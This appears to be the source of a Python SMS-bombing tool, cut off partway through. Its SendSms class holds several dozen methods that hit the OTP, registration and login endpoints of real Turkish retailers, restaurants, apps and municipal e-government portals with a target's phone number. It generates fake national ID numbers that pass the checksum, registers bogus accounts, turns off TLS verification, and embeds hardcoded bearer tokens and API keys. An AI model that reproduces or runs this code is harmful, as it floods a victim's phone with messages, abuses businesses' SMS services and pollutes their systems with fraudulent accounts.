import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style
from time import sleep
from os import system
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SendSms():
    adet = 0
    lock = threading.Lock()
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if len(mail) != 0 else ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
        self.session = requests.Session()
        # Session pool'u büyüt
        adapter = requests.adapters.HTTPAdapter(pool_connections=200, pool_maxsize=500, max_retries=0)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)

    def _post(self, url, **kwargs):
        """Hızlı POST isteği - timeout düşük, hata yönetimi minimal"""
        try:
            kwargs.setdefault('timeout', 3)
            kwargs.setdefault('verify', False)
            r = self.session.post(url, **kwargs)
            return r
        except:
            return None

    def KahveDunyasi(self):
        r = self._post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com"},
            json={"countryCode": "90", "phoneNumber": self.phone})
        if r and r.json().get("processStatus") == "Success":
            with self.lock: self.adet += 1
            return True
        return False

    def Wmf(self):
        r = self._post("https://www.wmf.com.tr/users/register/",
            data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", 
                  "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", 
                  "phone": f"0{self.phone}"})
        if r and r.status_code == 202:
            with self.lock: self.adet += 1
            return True
        return False

    def Bim(self):
        r = self._post("https://bim.veesk.net/service/v1.0/account/login",
            json={"phone": self.phone})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Englishhome(self):
        r = self._post("https://www.englishhome.com/api/member/sendOtp",
            headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com"},
            json={"Phone": self.phone, "XID": ""})
        if r and r.json().get("isError") == False:
            with self.lock: self.adet += 1
            return True
        return False

    def Suiste(self):
        r = self._post("https://suiste.com/api/auth/code",
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                     "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1",
                     "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS"},
            data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
                  "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1",
                  "is_contract": "1", "password": "31MeMaTi31"})
        if r and r.json().get("code") == "common.success":
            with self.lock: self.adet += 1
            return True
        return False

    def KimGb(self):
        r = self._post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",
            json={"msisdn": f"90{self.phone}"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Evidea(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://www.evidea.com/users/register/",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        if r and r.status_code == 202:
            with self.lock: self.adet += 1
            return True
        return False

    def Ucdortbes(self):
        r = self._post("https://api.345dijital.com/api/users/register",
            headers={"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0"},
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"})
        if r and "zaten kayıtlı" not in r.text:
            with self.lock: self.adet += 1
            return True
        return False

    def TiklaGelsin(self):
        r = self._post("https://svc.apps.tiklagelsin.com/user/graphql",
            headers={"Content-Type": "application/json", "X-Merchant-Type": "0", "Appversion": "2.4.1", "X-No-Auth": "true"},
            json={"operationName": "GENERATE_OTP", 
                  "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }",
                  "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", 
                                "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", 
                                "phone": f"+90{self.phone}"}})
        if r and r.json().get("data", {}).get("generateOtp") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Naosstars(self):
        r = self._post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
            headers={"Content-Type": "application/json", "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                     "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                     "Apiurl": "https://api.naosstars.com/api/", "Platform": "ios"},
            json={"telephone": f"+90{self.phone}", "type": "register"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Koton(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://www.koton.com/users/register/",
            data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        if r and r.status_code == 202:
            with self.lock: self.adet += 1
            return True
        return False

    def Hayatsu(self):
        r = self._post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"},
            data={"mobilePhoneNumber": self.phone, "actionType": "register"})
        if r and r.json().get("is_success") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Hizliecza(self):
        r = self._post("https://prod.hizliecza.net/mobil/account/sendOTP",
            headers={"Content-Type": "application/json", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Metro(self):
        r = self._post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
            headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1", "Applicationplatform": "2",
                     "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"},
            json={"methodType": "2", "mobilePhoneNumber": self.phone})
        if r and r.json().get("status") == "success":
            with self.lock: self.adet += 1
            return True
        return False

    def File(self):
        r = self._post("https://api.filemarket.com.tr/v1/otp/send",
            headers={"Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7"},
            json={"mobilePhoneNumber": f"90{self.phone}"})
        if r and r.json().get("responseType") == "SUCCESS":
            with self.lock: self.adet += 1
            return True
        return False

    def Akasya(self):
        r = self._post("https://akasyaapi.poilabs.com/v1/en/sms",
            headers={"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
                     "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1"},
            json={"phone": self.phone})
        if r and "successfully" in r.text:
            with self.lock: self.adet += 1
            return True
        return False

    def Akbati(self):
        r = self._post("https://akbatiapi.poilabs.com/v1/en/sms",
            headers={"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"},
            json={"phone": self.phone})
        if r and "successfully" in r.text:
            with self.lock: self.adet += 1
            return True
        return False

    def Komagene(self):
        r = self._post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
            headers={"Content-Type": "application/json", "Firmaid": "32",
                     "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq"},
            json={"FirmaId": 32, "Telefon": self.phone})
        if r and r.json().get("Success") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Porty(self):
        r = self._post("https://panel.porty.tech/api.php?",
            headers={"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ",
                     "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"job": "start_login", "phone": self.phone})
        if r and r.json().get("status") == "success":
            with self.lock: self.adet += 1
            return True
        return False

    def Tasdelen(self):
        r = self._post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
            headers={"Content-Type": "application/json", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3"},
            json={"phone": self.phone})
        if r and r.json().get("result") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Uysal(self):
        r = self._post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
            headers={"Content-Type": "application/json;charset=utf-8"},
            json={"phone_number": self.phone})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Yapp(self):
        r = self._post("https://yapp.com.tr/api/mobile/v1/register",
            headers={"Content-Type": "application/json", "Authorization": "Bearer ",
                     "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)"},
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati",
                  "device_type": "I", "device_version": "15.8.3", "email": self.mail,
                  "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2",
                  "lastname": "Bas", "phone_number": self.phone, "sms_code": ""})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def YilmazTicaret(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n"
        body += f"--{boundary}\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n"
        body += f"--{boundary}\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n"
        body += f"--{boundary}\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://app.buyursungelsin.com/api/customer/form/checkx",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                     "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Beefull(self):
        # Önce kayıt dene
        self._post("https://app.beefull.io/api/inavitas-access-management/signup",
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas",
                  "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail})
        # Sonra SMS login iste
        r = self._post("https://app.beefull.io/api/inavitas-access-management/sms-login",
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Dominos(self):
        r = self._post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
            headers={"Content-Type": "application/json;charset=utf-8",
                     "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg",
                     "Appversion": "IOS-7.1.0", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple"},
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone})
        if r and r.json().get("isSuccess") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Baydoner(self):
        r = self._post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
            headers={"Content-Type": "application/json", "Xsid": "2HB7FQ6G42QL", "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3",
                     "Os": "613A408535", "Merchantid": "5701", "Platform": "1", "Appv": "1.6.0",
                     "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR",
                  "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31",
                  "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": self.mail,
                  "GDPRPolicy": False, "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": False,
                  "merchantID": 5701, "Method": "", "Name": "Memati",
                  "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
                  "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
                  "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone,
                  "Platform": 1, "sessionID": "", "socialId": "", "SocialMethod": "", "Surname": "Bas",
                  "TempId": 0, "TermsAndConditions": False})
        if r and r.json().get("Control") == 1:
            with self.lock: self.adet += 1
            return True
        return False

    def Pidem(self):
        r = self._post("https://restashop.azurewebsites.net/graphql/",
            headers={"Content-Type": "application/json", "Authorization": "Bearer null",
                     "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15"},
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
                  "variables": {"phone": self.phone}})
        if r and r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS":
            with self.lock: self.adet += 1
            return True
        return False

    def Frink(self):
        r = self._post("https://api.frink.com.tr/api/auth/postSendOTP",
            headers={"Content-Type": "application/json", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1"},
            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone})
        if r and r.json().get("processStatus") == "SUCCESS":
            with self.lock: self.adet += 1
            return True
        return False

    def Bodrum(self):
        r = self._post("https://gandalf.orwi.app/api/user/requestOtp",
            headers={"Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
                     "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15"},
            json={"gsm": "+90"+self.phone, "source": "orwi"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def KofteciYusuf(self):
        r = self._post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
            headers={"Content-Type": "application/json; charset=utf-8", "Ostype": "iOS", "Appversion": "4.0.4.0",
                     "Firmaid": "82",
                     "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
                     "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone})
        if r and r.json().get("Success") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Little(self):
        r = self._post("https://api.littlecaesars.com.tr/api/web/Member/Register",
            headers={"Content-Type": "application/json; charset=utf-8",
                     "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg",
                     "X-Platform": "ios", "X-Version": "1.0.0",
                     "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True,
                  "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True})
        if r and r.status_code == 200 and r.json().get("status") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Orwi(self):
        r = self._post("https://gandalf.orwi.app/api/user/requestOtp",
            headers={"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg",
                     "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15"},
            json={"gsm": f"+90{self.phone}", "source": "orwi"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Coffy(self):
        r = self._post("https://user-api-gw.coffy.com.tr/user/signup",
            headers={"Content-Type": "application/json", "Language": "tr",
                     "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                     "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"},
            json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True,
                  "isUserAgreementApproved": True, "name": "Memati Bas"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Hamidiye(self):
        r = self._post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
            headers={"Content-Type": "application/json", "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
            json={"isGuest": False, "phone": self.phone})
        if r and r.json().get("result") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Money(self):
        r = self._post("https://www.money.com.tr/Account/ValidateAndSendOTP",
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-Requested-With": "XMLHttpRequest"},
            data={"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''})
        if r and r.json().get("resultType") == 0:
            with self.lock: self.adet += 1
            return True
        return False

    def Alixavien(self):
        r = self._post("https://www.alixavien.com.tr/api/member/sendOtp",
            headers={"Content-Type": "application/json"},
            json={"Phone": self.phone, "XID": ""})
        if r and r.json().get("isError") == False:
            with self.lock: self.adet += 1
            return True
        return False

    def Jimmykey(self):
        r = self._post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined")
        if r and r.json().get("Sonuc") == True:
            with self.lock: self.adet += 1
            return True
        return False

    def Ido(self):
        r = self._post("https://api.ido.com.tr/idows/v2/register",
            headers={"Content-Type": "application/json"},
            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24,
                  "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE",
                  "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131",
                  "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Fatih(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n28.12.1999\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n"
        body += f"--{boundary}--\r\n"
        r = self._post("https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet",
            data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        if r and r.status_code == 200:
            with self.lock: self.adet += 1
            return True
        return False

    def Sancaktepe(self):
        boundary = '----WebKitFormBoundary' + ''.join(choice(ascii_lowercase) for _ in range(16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n"
